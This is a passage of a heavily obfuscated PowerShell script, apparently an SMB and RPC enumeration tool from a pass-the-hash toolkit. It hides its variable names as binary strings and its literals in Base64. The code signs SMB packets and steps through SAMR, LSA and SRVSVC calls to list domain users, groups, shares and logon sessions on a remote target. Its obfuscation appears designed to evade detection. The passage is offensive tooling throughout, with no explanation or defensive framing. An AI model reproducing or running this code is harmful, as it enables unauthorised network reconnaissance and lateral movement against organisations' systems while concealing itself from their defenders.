                        ${00011010101110011} = _01000000010000001 0x09,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${00111000011010010} = _01100001010101100 ${10001010001100010} ${01111010001000010} ${10110001110011101} 0x00,0x00 ${00001110000101101} ${01100011100101100}
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}
                        ${01111100101100101} = _01010000000010000 ${01101100101001101} ${00110000110010110}.Length
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBBAE0AUgBDAGwAbwBzAGUAUgBlAHEAdQBlAHMAdAA=')))
                    {
                        ${01000100011101010}++
                        ${10010110101010100} = ${10010111110010011}
                        ${00011010101110011} = _01000000010000001 0x0b,0x00 0x01,0x00 ${10010001011010000} ${01000100011101010} ${01101100100111010} ${10111010000000010} ${10111101001010100}
                        ${10000000000000011} = _10010001101001000 ${01001101100110111}
                        ${00000100000001100} = _00010011110111111 ${10000000000000011} 
                        ${00111000011010010} = _10000100010100110 0x03 ${00000100000001100}.Length 0 0 0x09,0x00,0x00,0x00 0x00,0x00 0x01,0x00
                        ${01111100101100101} = _10010000011010010 0x17,0xc0,0x11,0x00 ${01101100101001101} ${00000100000001100}.Length 4280
                        ${00110000110010110} = _00010011110111111 ${00111000011010010}
                        ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        ${10111100010001110} = _00010011110111111 ${01111100101100101} 
                        ${10000000001000000} = ${10111100010001110}.Length + ${00110000110010110}.Length + ${00000100000001100}.Length
                        ${01011111100010011} = _10110111001100010 ${10100010000101011}.Length ${10000000001000000}
                        ${01000010010000100} = _00010011110111111 ${01011111100010011}
                        if(${10010001011010000})
                        {
                            ${01110000100100001} = ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                            ${01110000000000011} = ${10010101111010000}.ComputeHash(${01110000100100001})
                            ${01110000000000011} = ${01110000000000011}[0..15]
                            ${00011010101110011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01110000000000011}
                            ${10100010000101011} = _00010011110111111 ${00011010101110011}
                        }
                        ${00111101101010000} = ${01000010010000100} + ${10100010000101011} + ${10111100010001110} + ${00110000110010110} + ${00000100000001100}
                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    {
                        ${00010110101011010}.Write(${00111101101010000},0,${00111101101010000}.Length) > $null
                        ${00010110101011010}.Flush()
                        ${00010110101011010}.Read(${10110001011001111},0,${10110001011001111}.Length) > $null
                        if(_00010100011010010 ${10110001011001111}[12..15])
                        {
                            ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUABlAG4AZABpAG4AZwA=')))
                        }
                        else
                        {
                            ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUgBlAGMAZQBpAHYAZQBkAA==')))
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUABlAG4AZABpAG4AZwA=')))
                    {
                        ${00010110101011010}.Read(${10110001011001111},0,${10110001011001111}.Length) > $null
                        if([System.BitConverter]::ToString(${10110001011001111}[12..15]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAzAC0AMAAxAC0AMAAwAC0AMAAwAA=='))))
                        {
                            ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUgBlAGMAZQBpAHYAZQBkAA==')))
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUgBlAGMAZQBpAHYAZQBkAA==')))
                    {
                        switch (${10010110101010100})
                        {
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                            {
                                if(${01111110110100101} -eq 1)
                                {
                                    ${01001000000111010} = 0x73,0x00,0x61,0x00,0x6d,0x00,0x72,0x00 
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                                }
                                elseif(${01011011111111111} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAA=='))) -and ${10011101011100100}.Count -gt 0)
                                {
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                                }
                                else
                                {
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdAAyAA==')))
                            {
                                ${01111110110100101}++
                                if(${10110001011001111}[119] -eq 3 -and [System.BitConverter]::ToString(${10110001011001111}[140..143]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAA1AC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                                {
                                    if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))))
                                    {
                                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAHUAcwBlAHIAbgBhAG0AZQAgAGQAbwBlAHMAIABuAG8AdAAgAGgAYQB2AGUAIABwAGUAcgBtAGkAcwBzAGkAbwBuACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUAIABnAHIAbwB1AHAAcwAsACAAdQBzAGUAcgBzACwAIABhAG4AZAAgAE4AZQB0AFMAZQBzAHMAaQBvAG4AcwAgAG8AbgAgACQAdABhAHIAZwBlAHQA')))
                                    }
                                    else
                                    {
                                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAHUAcwBlAHIAbgBhAG0AZQAgAGQAbwBlAHMAIABuAG8AdAAgAGgAYQB2AGUAIABwAGUAcgBtAGkAcwBzAGkAbwBuACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUAIABnAHIAbwB1AHAAcwAgAG8AbgAgACQAdABhAHIAZwBlAHQA')))
                                    }
                                    ${00101100001001010} = $true 
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                                }
                                else
                                {
                                    ${01000001110011011} = 0x04,0x00,0x00,0x00
                                    [Byte[]]${10000101110111000} = ${10110001011001111}[140..159]
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBEAG8AbQBhAGkAbgA=')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdAA1AA==')))
                            {
                                ${01111110110100101}++
                                if(${10110001011001111}[119] -eq 3 -and [System.BitConverter]::ToString(${10110001011001111}[140..143]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAA1AC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                                {
                                    echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAHUAcwBlAHIAbgBhAG0AZQAgAGQAbwBlAHMAIABuAG8AdAAgAGgAYQB2AGUAIABwAGUAcgBtAGkAcwBzAGkAbwBuACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUAIAB1AHMAZQByAHMAIABvAG4AIAAkAHQAYQByAGcAZQB0AA==')))
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                                }
                                else
                                {
                                    ${01000001110011011} = 0x04,0x00,0x00,0x00
                                    [Byte[]]${10000101110111000} = ${10110001011001111}[156..175]
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBEAG8AbQBhAGkAbgA=')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                            {
                                if(${01011011111111111} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAA=='))))
                                {
                                    ${10001010001100010} = 0x48,0x00
                                    ${01111010001000010} = 2
                                    ${10110001110011101} = 0x01
                                    ${00001110000101101} = 0xc8,0x4f,0x32,0x4b,0x70,0x16,0xd3,0x01,0x12,0x78,0x5a,0x47,0xbf,0x6e,0xe1,0x88
                                    ${01100011100101100} = 0x03,0x00
                                    ${10010101010111101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBoAGEAcgBlAEUAbgB1AG0AQQBsAGwA')))
                                }
                                elseif(${01011011111111111} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBpAG8AbgA='))))
                                {
                                    ${10001010001100010} = 0x74,0x00
                                    ${01111010001000010} = 2
                                    ${10110001110011101} = 0x02
                                    ${00001110000101101} = 0xc8,0x4f,0x32,0x4b,0x70,0x16,0xd3,0x01,0x12,0x78,0x5a,0x47,0xbf,0x6e,0xe1,0x88
                                    ${01100011100101100} = 0x03,0x00
                                    ${10010101010111101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBFAG4AdQBtAA==')))
                                }
                                elseif(${01111110110100101} -eq 1)
                                {
                                    ${10001010001100010} = 0x48,0x00
                                    ${01111010001000010} = 5
                                    ${10110001110011101} = 0x01
                                    ${00001110000101101} = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xac
                                    ${01100011100101100} = 0x01,0x00
                                    if(${01011011111111111} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))))
                                    {
                                        ${10010101010111101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdAA1AA==')))
                                    }
                                    else
                                    {
                                        ${10010101010111101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdAAyAA==')))
                                    }
                                }
                                elseif(${01111110110100101} -gt 2)
                                {
                                    ${10001010001100010} = 0x48,0x00
                                    ${01111010001000010} = 14
                                    ${10110001110011101} = 0x01
                                    ${00001110000101101} = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xab
                                    ${01100011100101100} = 0x00,0x00
                                    ${01001000000111010} = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0x76,0x00,0x63,0x00
                                    ${10010101010111101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEATwBwAGUAbgBQAG8AbABpAGMAeQA=')))
                                }
                                else
                                {
                                    ${10001010001100010} = 0x48,0x00
                                    ${01111010001000010} = 1
                                    ${10110001110011101} = 0x01
                                    ${00001110000101101} = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xab
                                    ${01100011100101100} = 0x00,0x00
                                    ${01001000000111010} = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0x76,0x00,0x63,0x00
                                    ${10010101010111101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEATwBwAGUAbgBQAG8AbABpAGMAeQA=')))
                                }
                                ${01101100101001101} = ${10110001011001111}[132..147]
                                if($Refresh -and ${10010111110010011} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
                                {
                                    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAGUAcwBzAGkAbwBuACAAcgBlAGYAcgBlAHMAaABlAGQA')))
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                }
                                elseif(${01111110110100101} -ge 2)
                                {
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAEMAQgBpAG4AZAA=')))
                                }
                                elseif(${10010111110010011} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
                                {
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AEkAbgBmAG8AUgBlAHEAdQBlAHMAdAA=')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBEAG8AbQBhAGkAbgBVAHMAZQByAHMA')))
                            {
                                ${01111110110100101}++
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAFUAcwBlAHIAcwA=')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBlAG0AYgBlAHIAcwBJAG4AQQBsAGkAYQBzAA==')))
                            {
                                ${01111110110100101}++
                                [Byte[]]${10000100111101101} = ${10110001011001111}[140..([System.BitConverter]::ToInt16(${10110001011001111}[3..1],0) - 1)]
                                if([System.BitConverter]::ToString(${10110001011001111}[156..159]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NwAzAC0AMAAwAC0AMAAwAC0AYwAwAA=='))))
                                {
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBBAE0AUgBDAGwAbwBzAGUAUgBlAHEAdQBlAHMAdAA=')))
                                }
                                else
                                {
                                    ${01001000000111010} = 0x6c,0x00,0x73,0x00,0x61,0x00,0x72,0x00,0x70,0x00,0x63,0x00 
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                            {
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAG8AawB1AHAATgBhAG0AZQBzAA==')))
                            {
                                ${01111110110100101}++
                                [Byte[]]${00010011101010010} = ${10110001011001111}[152..155]
                                if([System.BitConverter]::ToString(${10110001011001111}[156..159]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NwAzAC0AMAAwAC0AMAAwAC0AYwAwAA=='))))
                                {
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBBAE0AUgBDAGwAbwBzAGUAUgBlAHEAdQBlAHMAdAA=')))
                                }
                                else
                                {
                                    if(${01111110110100101} -eq 4)
                                    {
                                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBHAHIAbwB1AHAA')))
                                    }
                                    else
                                    {
                                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBBAGwAaQBhAHMA')))
                                    }
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAG8AawB1AHAAUgBpAGQAcwA=')))
                            {
                                ${01111110110100101}++
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAEwAbwBvAGsAdQBwAFIAaQBkAHMA')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAQwBsAG8AcwBlAA==')))
                            {
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEATABvAG8AawB1AHAAUwBpAGQAcwA=')))
                            {
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAEwAbwBvAGsAdQBwAFMAaQBkAHMA')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEATwBwAGUAbgBQAG8AbABpAGMAeQA=')))
                            {
                                [Byte[]]${10110001111010000} = ${10110001011001111}[140..159]
                                if(${01111110110100101} -gt 2)
                                {
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEATABvAG8AawB1AHAAUwBpAGQAcwA=')))
                                }
                                else
                                {
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAUQB1AGUAcgB5AEkAbgBmAG8AUABvAGwAaQBjAHkA')))    
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAUQB1AGUAcgB5AEkAbgBmAG8AUABvAGwAaQBjAHkA')))
                            {
                                [Byte[]]${00101111110100101} = ${10110001011001111}[148..149]
                                ${10101000010001000} = [System.BitConverter]::ToInt16(${00101111110100101},0)
                                [Byte[]]${01110001101011011} = ${10110001011001111}[168..171]
                                ${00001000011000011} = [System.BitConverter]::ToInt32(${01110001101011011},0)
                                if(${00001000011000011} % 2)
                                {
                                    ${10101000010001000} += 2
                                }
                                [Byte[]]${01101001100111110} = ${10110001011001111}[(176 + ${10101000010001000})..(199 + ${10101000010001000})]
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEAQwBsAG8AcwBlAA==')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBFAG4AdQBtAA==')))
                            {
                                if([System.BitConverter]::ToString(${10110001011001111}[172..175]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAA1AC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                                {
                                    echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAHUAcwBlAHIAbgBhAG0AZQAgAGQAbwBlAHMAIABuAG8AdAAgAGgAYQB2AGUAIABwAGUAcgBtAGkAcwBzAGkAbwBuACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUAIABOAGUAdABTAGUAcwBzAGkAbwBuAHMAIABvAG4AIAAkAHQAYQByAGcAZQB0AA==')))
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                                }
                                elseif([System.BitConverter]::ToString(${10110001011001111}[12..15]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                                {
                                    echo "[-] NetSessEnum response error 0x$([System.BitConverter]::ToString(${10110001011001111}[15..12]) -replace '-','')"
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                                }
                                else
                                {
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAFMAUgBWAFMAVgBDAA==')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBoAGEAcgBlAEUAbgB1AG0AQQBsAGwA')))
                            {
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAFMAUgBWAFMAVgBDAA==')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBBAGwAaQBhAHMA')))
                            {
                                ${01111110110100101}++
                                [Byte[]]${00101111101011001} = ${10110001011001111}[140..159]
                                if([System.BitConverter]::ToString(${10110001011001111}[156..159]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NwAzAC0AMAAwAC0AMAAwAC0AYwAwAA=='))))
                                {
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBBAE0AUgBDAGwAbwBzAGUAUgBlAHEAdQBlAHMAdAA=')))
                                }
                                else
                                {
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBlAG0AYgBlAHIAcwBJAG4AQQBsAGkAYQBzAA==')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBEAG8AbQBhAGkAbgA=')))
                            {
                                ${01111110110100101}++
                                [Byte[]]${01001101100110111} = ${10110001011001111}[140..159]
                                if(${01011011111111111} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))))
                                {
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBEAG8AbQBhAGkAbgBVAHMAZQByAHMA')))
                                }
                                else
                                {
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAG8AawB1AHAATgBhAG0AZQBzAA==')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBHAHIAbwB1AHAA')))
                            {
                                ${01111110110100101}++
                                [Byte[]]${10010111111011110} = ${10110001011001111}[140..159]
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AEcAcgBvAHUAcABNAGUAbQBiAGUAcgA=')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AEcAcgBvAHUAcABNAGUAbQBiAGUAcgA=')))
                            {
                                ${01111110110100101}++
                                [Byte[]]${01010111110001001} = ${10110001011001111}[144..147]
                                ${01000101011110100} = [System.BitConverter]::ToInt16(${01010111110001001},0)
                                [Byte[]]${00100100101100011} = ${10110001011001111}[160..(159 + (${01000101011110100} * 4))]
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAG8AawB1AHAAUgBpAGQAcwA=')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AEkAbgBmAG8AUgBlAHEAdQBlAHMAdAA=')))
                            {
                                ${01101100101001101} = ${10110001011001111}[132..147]
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAEMAQgBpAG4AZAA=')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                            {
                                ${10010111110010011} = ${10010101010111101}
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAEMAQgBpAG4AZAA=')))
                            {
                                ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBBAE0AUgBDAGwAbwBzAGUAUgBlAHEAdQBlAHMAdAA=')))
                            {
                                ${01111110110100101}++
                                if(${01111110110100101} -eq 8)
                                {
                                    echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAEcAcgBvAHUAcAAgAGcAcgBvAHUAcAAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                                }
                                else
                                {
                                    if(${01111110110100101} -eq 5 -and ${01011011111111111} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA=='))))
                                    {
                                        ${01101001100111110} = 0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,0x20,0x00,0x00,0x00
                                        ${01000001110011011} = 0x01,0x00,0x00,0x00
                                    }
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBEAG8AbQBhAGkAbgA=')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                            {
                                ${10111010000000010} = ${10110001011001111}[40..43]
                                ${01001100111101000} = $null
                                if(${10110001011001111}[76] -eq 92)
                                {
                                    ${10100011101000101} = 0x00,0x00,0x00,0x00
                                }
                                else
                                {
                                    ${10100011101000101} = ${10110001011001111}[80..83]
                                }
                                if(${10011101011100100}.Count -gt 0)
                                {
                                    if(${10110001011001111}[76] -ne 92)
                                    {
                                        ForEach(${11000001101110001} in ${10100011101000101})
                                        {
                                            ${01001100111101000} = [System.Convert]::ToString(${11000001101110001},2).PadLeft(8,'0') + ${01001100111101000}
                                        }
                                        ${10101000011010100} | ? {$_.Share -eq ${10011101011100100}[${01001011101111011}]} | % {$_."Access Mask" = ${01001100111101000}}
                                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                                    }
                                    else
                                    {
                                        ${01001100111101000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwADAAMAAwAA==')))
                                        ${10101000011010100} | ? {$_.Share -eq ${10011101011100100}[${01001011101111011}]} | % {$_."Access Mask" = ${01001100111101000}}
                                        ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                                        ${01001011101111011}++
                                    }
                                }
                                else
                                {
                                    if(${01011011111111111} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAA=='))) -or ${01011011111111111} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBpAG8AbgA='))))
                                    {
                                        ${01001000000111010} = 0x73,0x00,0x72,0x00,0x76,0x00,0x73,0x00,0x76,0x00,0x63,0x00 
                                    }
                                    else
                                    {
                                        ${01001000000111010} = 0x6c,0x00,0x73,0x00,0x61,0x00,0x72,0x00,0x70,0x00,0x63,0x00 
                                    }
                                    ${01000011000100001} = ${10111010000000010}
                                    ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                            {
                                if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA'))))
                                {
                                    switch (${01011011111111111}) 
                                    {
                                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))
                                        {
                                            if(${00101100001001010})
                                            {
                                                ${01011011111111111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBoAGEAcgBlAA==')))
                                            }
                                            else
                                            {
                                                ${01011011111111111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))
                                                ${01111110110100101} = 0
                                            }
                                            ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                                        }
                                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))
                                        {
                                            ${01011011111111111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBpAG8AbgA=')))
                                            ${10010111110010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                                        }
